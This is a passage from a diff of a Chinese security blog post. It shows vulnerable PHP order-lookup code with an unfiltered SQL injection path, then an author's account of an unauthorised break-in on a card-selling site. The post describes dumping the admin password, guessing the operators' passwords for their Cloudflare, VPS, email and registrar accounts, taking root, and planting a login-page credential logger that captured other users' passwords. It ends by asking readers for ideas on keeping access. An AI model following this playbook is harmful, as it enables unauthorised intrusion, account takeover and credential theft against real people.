class="variable">$row</span>['dh'].'&lt;/span&gt;&lt;/span&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">              &lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">li</span>&gt;</span><br><span class="line">                  &lt;div <span class="keyword">class</span>=<span class="string">"cosA"</span>&gt;</span><br><span class="line">                      &lt;span <span class="keyword">class</span>=<span class="string">"cosIco label-danger"</span>&gt;</span><br><span class="line">                          &lt;i <span class="keyword">class</span>=<span class="string">"am-icon-key"</span>&gt;&lt;/i&gt;</span><br><span class="line">                      &lt;/span&gt;</span><br><span class="line">                      &lt;span&gt; 卡密: &lt;span <span class="keyword">class</span>=<span class="string">"font-red"</span>&gt;(1行/1个)&lt;/span&gt;&lt;/span&gt;</span><br><span class="line">                      &lt;textarea rows=<span class="string">"5"</span>&gt;'.<span class="variable">$kms</span>.'&lt;/textarea&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">              &lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">li</span>&gt;</span><br><span class="line">                  &lt;div <span class="keyword">class</span>=<span class="string">"cosA"</span>&gt;</span><br><span class="line">                      &lt;span <span class="keyword">class</span>=<span class="string">"cosIco label-warning"</span>&gt;</span><br><span class="line">                          &lt;i <span class="keyword">class</span>=<span class="string">"am-icon-jpy"</span>&gt;&lt;/i&gt;</span><br><span class="line">                      &lt;/span&gt;</span><br><span class="line">                      &lt;span&gt; 价格:&lt;span <span class="keyword">class</span>=<span class="string">"font-green"</span>&gt;'.<span class="variable">$sp</span>['money'].'&lt;/span&gt;&lt;/span&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">              &lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">li</span>&gt;</span><br><span class="line">                  &lt;div <span class="keyword">class</span>=<span class="string">"cosA"</span>&gt;</span><br><span class="line">                      &lt;span <span class="keyword">class</span>=<span class="string">"cosIco"</span>&gt;</span><br><span class="line">                          &lt;i <span class="keyword">class</span>=<span class="string">"am-icon-credit-card"</span>&gt;&lt;/i&gt;</span><br><span class="line">                      &lt;/span&gt;</span><br><span class="line">                      &lt;span&gt; 支付方式:&lt;span <span class="keyword">class</span>=<span class="string">"font-green"</span>&gt;'.<span class="variable">$row</span>['mode'].'&lt;/span&gt;&lt;/span&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">              &lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">li</span>&gt;</span><br><span class="line">                  &lt;div <span class="keyword">class</span>=<span class="string">"cosA"</span>&gt;</span><br><span class="line">                      &lt;span <span class="keyword">class</span>=<span class="string">"cosIco label-warning"</span>&gt;</span><br><span class="line">                          &lt;i <span class="keyword">class</span>=<span class="string">"am-icon-history"</span>&gt;&lt;/i&gt;</span><br><span class="line">                      &lt;/span&gt;</span><br><span class="line">                      &lt;span&gt; 提卡时间:&lt;span <span class="keyword">class</span>=<span class="string">"font-green"</span>&gt;'.<span class="built_in">date</span>('Y-<span class="keyword">m</span>-<span class="keyword">d</span> <span class="keyword">H</span>:i:s',<span class="variable">$row</span>['time']).'&lt;/span&gt;&lt;/span&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">              &lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">          &lt;/ul&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    ';<span class="comment">//输出查询结果代码</span></span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//查询支付宝数据是否存在此单号</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"SELECT * FROM `zfb` WHERE `dh` LIKE '"</span>.<span class="variable">$_POST</span>['text'].<span class="string">"'"</span>;<span class="comment">//设置sql语句查询支付宝单号列表是否存在此单号</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$config</span>-&gt;<span class="keyword">query</span>(<span class="variable">$sql</span>);<span class="comment">//执行语句并获取结果</span></span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc();<span class="comment">//解析结果并分组</span></span><br><span class="line">    <span class="variable">$mode</span> = '支付宝';</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$row</span>)&#123;</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">"SELECT * FROM `qq` WHERE `dh` LIKE '"</span>.<span class="variable">$_POST</span>['text'].<span class="string">"'"</span>;<span class="comment">//设置sql语句查询QQ单号列表是否存在此单号</span></span><br><span class="line">      <span class="variable">$result</span> = <span class="variable">$config</span>-&gt;<span class="keyword">query</span>(<span class="variable">$sql</span>);<span class="comment">//执行语句并获取结果</span></span><br><span class="line">      <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc();<span class="comment">//解析结果并分组</span></span><br><span class="line">      <span class="variable">$mode</span> = 'QQ钱包';</span><br><span class="line">      <span class="keyword">if</span>(!<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">"SELECT * FROM `wx` WHERE `dh` LIKE '"</span>.<span class="variable">$_POST</span>['text'].<span class="string">"'"</span>;<span class="comment">//设置sql语句查询微信单号列表是否存在此单号</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$config</span>-&gt;<span class="keyword">query</span>(<span class="variable">$sql</span>);<span class="comment">//执行语句并获取结果</span></span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc();<span class="comment">//解析结果并分组</span></span><br><span class="line">        <span class="variable">$mode</span> = '微信支付';</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>仔细看过后易知，起作用的语句：<br><code>$_POST[&#39;text&#39;] = intval($_POST[&#39;text&#39;])</code><br>被写到第一个if判断正确之后才会执行的流程里面了</p>
+<p>我们只需要让他判断的条件为否，进入else流程内执行sql，就可以传入没有过滤的$_POST[‘text’]了。</p>
+<p>intval函数会把传入的注入语句字符串默认转为0,还好这里没有订单号为0的数据，自然返回的$row也就是NULL,从而php代码会执行else之后的部分，之后的部分他并没有进行过滤。</p>
+<p>并且这个开发作者安全意识并不高，后台管理员密码居然是明文储存的。</p>
+<p><img src="/2018/10/26/Hack-Record1/inject.png" alt=""></p>
+<p>尝试本地搭建获得库的结构</p>
+<p><img src="/2018/10/26/Hack-Record1/shujuku.png" alt=""></p>
+<p>简单构造语句写出脚本注出密码成功登录后台，发现除了一片白花花的邀请码其他什么可利用的功能的都没有。(这里当时没截图)</p>
+<p>冷静思考后尝试用注入出来的后台密码去登录主站的后台居然进去了</p>
+<p>主站是wordpress的话，尝试修改配置文件拿shell，可惜每次插入一句话木马，点击保存都会卡几分钟后提示操作失败。猜测是cloudflare CDN把请求拦截了，直接getshell怕是不行了(后来进服务器发现有宝塔btwaf服务，猜测或许是被规则拦截了)</p>
+<p>于是换个思路:</p>
+<pre><code>再收集其信息，确定了几个常用邮箱，开始尝试密码组合登录cloudflare
+</code></pre><p>不得不说常用密码这个弱点太无敌了，直接登录了他的cloudflare账户。</p>
+<p>汗，这个人为了开个破黄网居然买了这么多不同后缀的域名！</p>
+<p><img src="/2018/10/26/Hack-Record1/cloudflare.png" alt=""></p>
+<p>发现很多二级域名最开始还没发现 = =！</p>
+<p><img src="/2018/10/26/Hack-Record1/ipxx.png" alt=""></p>
+<h2 id="0x02-回到真实之后"><a href="#0x02-回到真实之后" class="headerlink" title="0x02 回到真实之后:"></a>0x02 回到真实之后:</h2><p>得到服务器真实ip，我们可以进一步搜集信息</p>
+<p>这里说下我的思路：</p>
+<p>在tool.chinaz.com中查看ipwhois</p>
+<p><img src="/2018/10/26/Hack-Record1/ipwhois.png" alt=""></p>
+<p>得到它的vps服务商是CubeCloud的</p>
+<p>百度发现是一家名叫魔方云的主机商</p>
+<p>其他服务器也有在阿里云的，不过主站在魔方云还是先搞主站</p>
+<p>尝试密码组合登录进魔方云主机管理平台(发现他好喜欢用@，密码不是xxxx@就是xxxx@@)</p>
+<p><img src="/2018/10/26/Hack-Record1/pass.png" alt=""></p>
+<p><img src="/2018/10/26/Hack-Record1/cube.png" alt=""></p>
+<p><img src="/2018/10/26/Hack-Record1/vpscp.png" alt=""></p>
+<p>直接可以通过网页管理端申请1小时在线管理终端，蹦出来h5的console，进去就是root权限</p>
+<p><img src="/2018/10/26/Hack-Record1/serverinfo.png" alt=""></p>
+<p>这里随便翻翻，可以发现他是用宝塔在维护管理服务器的</p>
+<p><img src="/2018/10/26/Hack-Record1/baota.png" alt=""></p>
+<p>将其整站源码打包带走，百度盘的资源有300多个。</p>
+<p><img src="/2018/10/26/Hack-Record1/ziyuan.png" alt=""></p>
+<p>发现数据库配置密码也没能逃出我猜测的几个密码集合 233</p>
+<p>给了基友们一些网站的邀请码，站长可能发现新注册的用户跟收钱记录不符，起了疑心把后台管理密码改了。</p>
+<p>遂把他wp后台登录页面改写了下添加了监控账号密码功能，用终端直接wget传上去解压覆盖达到了监控目的，顺便又能蹲一波他常用的密码，结果这个网站所有用户都是通过后台登录的，捕获了一大堆非管理用户…</p>
+<p><img src="/2018/10/26/Hack-Record1/users.png" alt=""></p>
+<p>后又将他的网易邮箱，阿里云，以及通过域名whois查到的域名商dynadot账户都一一缴获了，用常用的几个密码真是太不安全了。</p>
+<p><img src="/2018/10/26/Hack-Record1/infomation.png" alt=""></p>
+<p>通过部署各种监控代码、查看日志、各种平台注册信息等等发现他不是一个人在战斗，尼玛他们是一个团伙啊！！</p>
+<p>此团人员分布在河南、四川、上海等地</p>
+<p>有人负责发布资源、有人则负责建设和维护网站(显然没有一点点安全意识)</p>
+<p>负责网站建设的是00后，自称鑫爵，颇喜欢用’qq’ + 自己生日 + 一两个@当作密码</p>
+<p>负责收款的30多岁，目测网站月盈利万元，果然赚钱的法子都写在刑法上…</p>
+<h2 id="0x03总结-amp-后续"><a href="#0x03总结-amp-后续" class="headerlink" title="0x03总结&amp;后续:"></a>0x03总结&amp;后续:</h2><p>从这次渗透可以看出来信息收集的重要性，不要放过任何一个可能有用的信息，利用好了可能就是秒杀。</p>
+<p>后续服务器权限并不好控制，被发现后服务器被重置了，vps管理平台密码也被改了，很无奈。<br>中间一些操作有点着急了，使得行为暴露的很彻底(网易和阿里云异地登录记录)。</p>
+<p>各位有什么好的持续控制思路求分享~ 希望能学习下各位的思路 ，可以私信加好友一起玩啊…</p>
+<h2 id="To-Be-Continued"><a href="#To-Be-Continued" class="headerlink" title="To Be Continued:"></a>To Be Continued:</h2><p>距这次渗透已经过去了3个月，最近发现这个团伙换了个域名又开始作案了，发卡平台系统也更新了，真是无语。<br>潜入了那个发卡平台交流群，从公告得知这位开发者已经发现这个漏洞啦(可能是监测到了我注入他官网发的一系列http请求日志)</p>
+<p>我还是太年轻，渗透未完待续…</p>
+<p><img src="/2018/10/26/Hack-Record1/edlm.png" alt=""></p>
+<p>######最后 admin@recorday.cn 求web安全实习机会~</p>
 
       
 
@@ -274,7 +263,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">XSS 跨站脚本攻击</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
         		</li>
       		
 		</ul>
@@ -293,15 +282,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2018/01/26/XSS-Explain-2/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          XSS-Explain-2
-        
-      </div>
-    </a>
   
+    <a href="/2018/09/25/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Hello World</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
